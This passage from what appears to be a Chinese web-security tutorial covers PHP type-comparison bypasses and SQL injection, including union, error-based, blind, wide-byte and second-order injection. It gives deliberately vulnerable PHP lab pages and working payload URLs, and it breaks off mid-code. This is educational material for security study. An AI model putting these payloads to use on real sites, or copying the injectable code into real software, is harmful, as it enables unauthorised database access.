class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span> [], <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span> )<br></code></pre></td></tr></table></figure><p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$a</span>));  <span class="hljs-comment">// int(0) ==&gt; 返回键值0</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;1admin&quot;</span>,<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// int(1) ==&gt; 返回键值1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>array_search函数 类似于 &#x3D;&#x3D; 也就是$a &#x3D;&#x3D;”admin” 当然是$a&#x3D;0  当然如果第三个参数为true则就不能绕过。</p><h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;***************&quot;</span><br>     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Right!!!login success&quot;</span>;n<br>            <span class="hljs-keyword">exit</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong password..&quot;</span>;<br>        &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li><li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li><li>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li><li>payload: password[]&#x3D;xxx</li></ul><h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;4admin&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$a</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail1&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail2&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail3&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sucess&quot;</span>;  <span class="hljs-comment">//结果输出success;</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;failall&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>原理和上面一样</p><h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxxx&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;The time must be number.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &lt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">2</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too short.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &gt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">3</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too long.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>                <span class="hljs-title function_ invoke__">sleep</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>        &#125; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">()</span></span>，不能正确转换的类型有十六进制型字符串、科学计数法型字符串<br><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">()</span></span>支持普通数字型字符串、科学记数法型字符串、部分支持十六进制<span class="hljs-number">0</span>x型字符串<br></code></pre></td></tr></table></figure><p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt;  time &lt;  7776000</p><p>通过is_number() 能传入科学计数法，来进行绕过。</p><p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>按照参数类型分类，按数据库返回的结果分类等。</p><h5 id="按照参数类型分类"><a href="#按照参数类型分类" class="headerlink" title="按照参数类型分类"></a>按照参数类型分类</h5><p>按照参数类型可以分为两类:数值型、字符型</p><p>简单来说，就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">数字型注入<br>加单引号 错误出异常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> 正常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> 异常<br><br>字符型注入<br>加单引号 错误出异常<br><span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1 正常</span><br><span class="hljs-string">and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">2</span> 异常<br></code></pre></td></tr></table></figure><h5 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h5><p>程序拼接的变量值没有被引号包裹。数值型注入是无视php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义函数的影响的。如果程序没有对关键字或者特殊符号过滤或者过滤不严(比如没有过滤union、select等关键字,可以使用联合注入,过滤了union、select等关键字,可以用盲注或者报错注入等方法)</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;新闻1&#x27;, &#x27;这是第一篇文章&#x27;),<br>(2, &#x27;新闻2&#x27;, &#x27;这是第二篇文章&#x27;);<br></code></pre></td></tr></table></figure><p>sqlinjection.php(test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sql出错会报错，方便观察</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;新闻&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$row[&#x27;tid&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 union select 1,2,user() --<br></code></pre></td></tr></table></figure><p>没有回显可以尝试下看能不能报错注入,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure><p>也可以试下时间盲注,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and sleep(3) --<br></code></pre></td></tr></table></figure><p>也可以试下bool盲注(看能不能引起页面变化):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure><p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)。</p><p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p><h5 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h5><p>程序拼接的变量被引号包裹。字符型注入是是受php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义的函数影响的。如果程序没有对引号和关键字或者特殊符号过滤或者过滤不严,可能会导致sql注入。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]; p = <span class="hljs-number">100</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where p = &#x27;3&#x27; and &#x27;1&#x27;=&#x27;2&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>闭合单引号,如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; union select 1,2,user() --<br></code></pre></td></tr></table></figure><p>闭合单引号,没有回显可以尝试下看能不能报错注入,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure><p>也可以试下时间盲注,比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and sleep(5) --<br></code></pre></td></tr></table></figure><p>也可以试下bool盲注(看能不能引起页面变化):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure><p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)</p><p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p><h5 id="按数据库返回的结果分类"><a href="#按数据库返回的结果分类" class="headerlink" title="按数据库返回的结果分类"></a>按数据库返回的结果分类</h5><p>据数据库返回的结果,分为回显注入、报错注入、盲注。</p><h5 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h5><p>可以直接在存在注入点的当前页面中获取返回结果,可以使用回显注入。</p><p>常见利用:</p><blockquote><p>union select</p></blockquote><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>程序将数据库的返回错误信息直接显示在页面中。虽然没有返回数据库的查询结果,但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p>常见利用:</p><blockquote><p>floor<br>updatexml<br>extractvalue</p></blockquote><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。</p><ul><li>bool盲注(based boolean)<ul><li>如果测试时发现页面有变化,可以尝试使用bool盲注</li></ul></li><li>时间盲注(based time)<ul><li>如果测试时页面无变化,但是通过sleep发现页面存在延迟,可以尝试使用时间盲注</li></ul></li></ul><p>利用:</p><ul><li>Length()、Substr()、Ascii()、sleep()、if(expr1,expr2,expr3)等结合使用</li></ul><h5 id="其他特殊注入"><a href="#其他特殊注入" class="headerlink" title="其他特殊注入"></a>其他特殊注入</h5><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>形成条件:</p><ul><li>开启了<code>gpc</code>或使用<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>等对引号转义的函数</li><li>使用了<code>SET NAMES 多字节编码</code>或者<code>set character_set_client=多字节编码</code>指令,这里多字节编码低位的范围需要覆盖0x5C才能导致注入。我们最常见的是<code>gbk</code>编码。</li></ul><p>假如代码中设置的是GBK编码(mysql那端表或者字段设置的编码无影响,会自动转换),这时只要引入宽字节高位编码吃掉<code>\</code>(%5c),就导致了宽字节注入的发生。</p><p>可以参考<a href="https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/">sql注入：宽字节注入(gbk双字节绕过)</a></p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;新闻1&#x27;, &#x27;这是第一篇文章&#x27;),<br>(2, &#x27;新闻2&#x27;, &#x27;这是第二篇文章&#x27;);<br></code></pre></td></tr></table></figure><p>sqlgbkinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-comment">//执行sql语句</span><br><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) : <span class="hljs-number">1</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sql出错会报错，方便观察</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;gbk&quot;</span> /&gt;<br>&lt;title&gt;新闻&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;<span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_free_result</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>测试:<br><code>http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23</code></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>首先将构造好的利用代码写入网站保存,再第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。</p><p>比如sql二次注入:</p><p>在第一次进行数据库插入数据的时候，仅仅只是使用了<code> addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>eg:<br>数据表使用的是上面news表</p><p>secondaryinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span 